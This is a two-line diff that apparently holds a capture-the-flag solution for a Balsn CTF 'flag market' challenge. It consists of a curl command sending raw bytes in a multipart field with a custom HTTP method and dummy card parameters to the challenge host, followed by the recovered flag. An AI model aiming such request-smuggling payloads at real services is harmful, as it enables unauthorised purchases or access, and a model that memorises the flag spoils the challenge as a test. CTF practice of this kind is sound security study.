@@ -1,0 +1,2 @@
+python3 -c 'import sys; sys.stdout.buffer.write(bytes(range(256)))' | curl -v -XSPECIAL_METHOD_TO_BUY_FLAG 'http://flag-market-us.balsnctf.com:52696/buy_flag?card_holder=M3OW/ME0W&card_number=4518961863728788&card_exp_year=2222&card_exp_month=12&card_cvv=618&card_money=1337313370' -F'padding=<-;headers="content-type: text/plain;charset=latin-1"'
+# BALSN{Y0u_4r3_5O_r!Ch!1!i!11c879ce73abb2583f878d07d90830b9}
